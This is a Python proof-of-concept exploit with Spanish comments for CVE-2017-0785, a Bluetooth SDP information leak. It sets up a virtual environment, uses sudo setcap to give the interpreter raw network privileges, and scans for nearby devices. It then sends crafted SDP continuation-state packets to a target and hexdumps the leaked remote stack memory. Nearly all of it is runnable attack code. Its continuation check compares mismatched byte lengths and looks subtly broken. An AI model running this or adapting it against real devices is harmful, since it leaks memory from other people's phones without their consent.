import os
import subprocess
import sys

# Directorio del entorno virtual en la carpeta actual
VENV_DIR = "./meli"

# Crear entorno virtual si no existe
if not os.path.isdir(VENV_DIR):
    print("[*] Creando entorno virtual 'meli'")
    subprocess.run([sys.executable, "-m", "venv", VENV_DIR])

# Función para activar el entorno virtual en el código
def activate_virtualenv():
    activate_script = os.path.join(VENV_DIR, "bin", "activate_this.py")
    with open(activate_script) as f:
        exec(f.read(), dict(__file__=activate_script))

activate_virtualenv()

# Función para instalar paquetes en el entorno virtual
def install_package(package):
    subprocess.run([os.path.join(VENV_DIR, "bin", "pip"), "install", package])

# Verificar e instalar dependencias
def check_and_install():
    try:
        import bluetooth
        import pwn
        print("[*] Dependencias ya están instaladas")
    except ImportError:
        print("[*] Instalando dependencias pybluez y pwntools")
        install_package("git+https://github.com/pybluez/pybluez.git --no-use-pep517")
        install_package("pwntools")

check_and_install()

# Configurar permisos para el adaptador Bluetooth
print("[*] Configurando permisos de Bluetooth para Python")
subprocess.run(["sudo", "setcap", "cap_net_raw+eip", subprocess.check_output(["readlink", "-f", os.path.join(VENV_DIR, "bin", "python3")]).strip().decode()])

# Código de la PoC
from pwn import *
import bluetooth

def buscar_dispositivos():
    log.info("Escaneando dispositivos Bluetooth...")
    dispositivos = bluetooth.discover_devices(duration=8, lookup_names=True)
    if not dispositivos:
        log.warning("No se encontraron dispositivos. Asegúrate de que el dispositivo de destino esté encendido y dentro del alcance.")
    for addr, name in dispositivos:
        print(f"Dirección: {addr} - Nombre: {name}")
    return dispositivos

if not 'TARGET' in args:
    log.info("Uso: CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX:XX")
    dispositivos = buscar_dispositivos()
    exit()

target = args['TARGET']
service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 30

def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    pkt += continuation_state
    return pkt

p = log.progress('Exploit')
p.status('Creating L2CAP socket')

sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'

p.status('Connecting to target')
sock.connect((target, 1))

p.status('Sending packet 0')
sock.send(packet(service_long, b'\x00'))
data = sock.recv(mtu)

if data[-3:] != b'\x02':
    log.error('Invalid continuation state received.')

stack = b''

for i in range(1, n):
    p.status('Sending packet %d' % i)
    sock.send(packet(service_short, data[-3:]))
    data = sock.recv(mtu)
    stack += data[9:-3]

sock.close()

p.success('Done')

print(hexdump(stack))
